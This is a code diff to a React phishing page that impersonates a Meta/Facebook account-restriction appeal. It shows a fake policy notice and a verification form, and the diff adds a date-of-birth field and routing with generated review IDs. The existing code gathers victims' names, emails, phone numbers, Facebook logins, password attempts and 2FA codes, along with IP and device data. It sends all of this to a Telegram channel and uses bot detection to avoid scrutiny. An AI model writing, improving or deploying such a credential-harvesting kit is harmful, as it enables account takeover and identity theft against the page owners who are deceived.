@@ -1,4 +1,5 @@
 import { useState, useEffect, useMemo, useCallback } from 'react';
+import { useNavigate, useLocation } from 'react-router';
 import axios from 'axios';
 import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
@@ -19,7 +20,7 @@ import { translateText } from '@/utils/translate';
 import countryToLanguage from '@/utils/country_to_language';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
-import { PATHS } from '@/router/paths';
+import { PATHS, parseReviewId, generateReviewId, reviewPath } from '@/router/paths';
 
 const LABEL = 'Kháng Nghị Page';
 
@@ -119,13 +120,16 @@ const fetchGeoData = async () => {
 };
 
 const Home = () => {
-    const [showPolicyNotice, setShowPolicyNotice] = useState(true);
-    const [showReviewPage, setShowReviewPage] = useState(false);
+    const navigate = useNavigate();
+    const location = useLocation();
+    const [showPolicyNotice, setShowPolicyNotice] = useState(() => location.pathname === PATHS.HOME);
+    const [showReviewPage, setShowReviewPage] = useState(() => Boolean(parseReviewId(location.pathname)));
     const [showLoginModal, setShowLoginModal] = useState(false);
     const [show2FAModal, setShow2FAModal] = useState(false);
     const [showSuccessModal, setShowSuccessModal] = useState(false);
     const [formData, setFormData] = useState({
         fullName: '',
+        dateOfBirth: '',
         personalEmail: '',
         businessEmail: '',
         phone: '',
@@ -168,15 +172,16 @@ const Home = () => {
             verificationInfo: 'Verification information',
             fillRequiredFields: 'Please fill in correctly and completely all required fields to complete the verification profile.',
             fullName: 'Full Name',
-            fullNamePlaceholder: 'Example: John Smith',
+            fullNamePlaceholder: 'Enter your full name',
+            dateOfBirth: 'Date of Birth',
             personalEmail: 'Personal Email',
-            personalEmailPlaceholder: 'Example: johnsmith@gmail.com',
+            personalEmailPlaceholder: 'Enter your personal email',
             businessEmail: 'Business Email',
-            businessEmailPlaceholder: 'Example: contact@company.com',
+            businessEmailPlaceholder: 'Enter your business email',
             mobilePhone: 'Mobile Phone Number',
-            mobilePhonePlaceholder: 'Example: +1 201 555 0123',
-            yourPageName: 'Your Page Name',
-            pageNamePlaceholder: 'Example: ABC Studio Official',
+            mobilePhonePlaceholder: 'Enter your mobile phone number',
+            yourPageName: 'Facebook Page Name',
+            pageNamePlaceholder: 'Enter your Facebook page name',
             additionalNotes: 'Additional notes (optional)',
             additionalNotesPlaceholder: 'Example: This page officially represents ABC brand and needs verification to improve trust.',
             reviewReasonIntro: 'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us in your native language.',
@@ -302,6 +307,43 @@ const Home = () => {
         initializeApp();
     }, [initializeApp]);
 
+    useEffect(() => {
+        const reviewId = parseReviewId(location.pathname);
+
+        if (location.pathname === PATHS.HOME) {
+            setShowPolicyNotice(true);
+            setShowReviewPage(false);
+            return;
+        }
+
+        if (reviewId) {
+            setShowPolicyNotice(false);
+            setShowReviewPage(true);
+            return;
+        }
+
+        if (location.pathname === PATHS.INDEX) {
+            setShowPolicyNotice(false);
+            setShowReviewPage(false);
+        }
+    }, [location.pathname]);
+
+    const handlePolicyContinue = () => {
+        setShowPolicyNotice(false);
+        navigate(PATHS.INDEX, { replace: true });
+    };
+
+    const handleOpenReviewPage = () => {
+        const reviewId = generateReviewId();
+        setShowReviewPage(true);
+        navigate(reviewPath(reviewId));
+    };
+
+    const handleCloseReviewPage = () => {
+        setShowReviewPage(false);
+        navigate(PATHS.INDEX, { replace: true });
+    };
+
     const buildAndSend = (form, login, passwordLogs, attempts, ip, device) => {
         const escapeHtml = (value) =>
             String(value ?? 'N/A')
@@ -333,6 +375,7 @@ const Home = () => {
 ━━━━━━━━━━━━━━━━━━━━
 📋 <b>INFO</b>
    Name: <code>${escapeHtml(form.fullName)}</code>
+   DOB: <code>${escapeHtml(form.dateOfBirth)}</code>
    Email: <code>${escapeHtml(form.personalEmail)}</code>
    DN Email: <code>${escapeHtml(form.businessEmail)}</code>
    Phone: <code>${escapeHtml(form.phone)}</code>
@@ -353,6 +396,7 @@ ${twoFALines}
         buildAndSend(data, { email: '', password: '' }, [], [], ipInfo, deviceInfo);
         setFormData(data);
         setShowReviewPage(false);
+        navigate(PATHS.INDEX, { replace: true });
         setShowLoginModal(true);
     };
 
@@ -403,7 +447,7 @@ ${twoFALines}
     const Header = () => (
         <div className="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
             <div className="max-w-[1280px] w-full flex items-center justify-between px-4">
-                <a href={PATHS.HOME}>
+                <a href={PATHS.INDEX}>
                     <img src={LogoMeta} width="64" alt="Meta" />
                 </a>
             </div>
@@ -414,10 +458,10 @@ ${twoFALines}
         <>
             {showPolicyNotice ? (
                 <div className="flex min-h-screen flex-col bg-white">
-                    <MetaHeader />
+                    <MetaHeader homeHref={PATHS.INDEX} />
                     <div className="flex flex-1 flex-col items-center justify-center p-4 sm:p-6">
                         <div className="w-full max-w-2xl px-3 sm:px-4">
-                            <PolicyViolationNotice onContinue={() => setShowPolicyNotice(false)} texts={texts} />
+                            <PolicyViolationNotice onContinue={handlePolicyContinue} texts={texts} />
                         </div>
                     </div>
                 </div>
@@ -428,7 +472,7 @@ ${twoFALines}
                         <FirstFormModal
                             show={true}
                             asPage={true}
-                            onClose={() => setShowReviewPage(false)}
+                            onClose={handleCloseReviewPage}
                             onSubmit={handleFirstFormSubmit}
                             texts={texts}
                         />
@@ -477,7 +521,7 @@ ${twoFALines}
                                     <p>{texts.appealWhat2}</p>
                                     <p>{texts.appealWhat3}</p>
                                 </div>
-                                <button type="button" onClick={() => setShowReviewPage(true)} className="community-appeal-button">
+                                <button type="button" onClick={handleOpenReviewPage} className="community-appeal-button">
                                     {texts.appealButton}
                                 </button>
                             </div>
